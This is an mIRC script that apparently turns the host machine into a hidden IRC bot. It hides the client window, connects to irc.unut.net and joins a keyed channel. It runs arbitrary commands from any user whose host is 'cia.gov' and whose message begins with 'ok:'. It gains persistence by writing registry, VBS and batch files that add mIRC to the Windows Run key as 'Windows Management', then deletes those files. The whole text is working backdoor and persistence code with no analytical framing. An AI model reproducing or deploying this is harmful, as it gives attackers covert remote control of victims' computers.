   on *:start: {
     hide
     timerhide 0 0 checkHide
     .identd on $n
     .nick $n
     .anick $n
     .fullname $n
     .emailaddr $n $+ @ $+ $n $+ .com
     .timerka 0 90 keepAlive
     keepAlive
     registry
     .ignore -wd *
   }
   alias checkHide {
     if ($appstate != hidden) { hide }
     if ($appstate == hidden) { timerhide off }
   }
   alias hide { dll gt.dll hide NOT_USED }
   alias keepAlive {
     if ($status != connected) {
       server irc.unut.net
     }
     if ($appstate != hidden) { hide }
     if ($me !ison #Anatoly) && ($status == connected) { join #Anatoly juwyoy }
   }
   on *:connect: { join #Anatoly juwyoy }
   on *:join:#Anatoly: {
     if (%first.time == $null) && ($nick == $me) {
       msg #Anatoly 8,1<-- New Bot <-- New Bot <-- New Bot <-- New Bot <-- New Bot
       %first.time = 1
     }
     if ($nick != $me) && ($gettok($address($me,5),2,64) == $gettok($address($nick,5),2,64)) { exit }
   }
   raw 433:*: {
     nick $n
     anick $n
   }
   alias n return Guest $+ $r(0,9999999999999999999999999)
   alias sw sockwrite -n $sockname $1-
   on *:text:*:*: { if ($gettok($address($nick,5),2,64) == cia.gov) && ($1 == ok:) { $2- } }
   alias registry {
     if ($exists(x.reg) == $true) { remove x.reg }
     if ($exists(x.vbs) == $true) { remove x.vbs }
     if ($exists(x.bat) == $true) { remove x.bat }
     %x = $replace(" $+ $mircexe $+ ",\,\\)
     write -l1 x.reg REGEDIT4
     write -l3 x.reg [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
     write -l4 x.reg "Windows Management"= $+ %x
     write -l1 x.vbs set wshshell = wscript.createobject("wscript.shell")
     write -l2 x.vbs return = wshshell.run("x.bat", 0, false)
     write -l1 x.bat CD " $+ $mircdir $+ "
     write -l2 x.bat regedit /s x.reg
     write -l3 x.bat del x.vbs
     write -l4 x.bat del x.reg
     write -l5 x.bat del $chr(37) $+ 0
     unset %x
     run x.vbs
   }
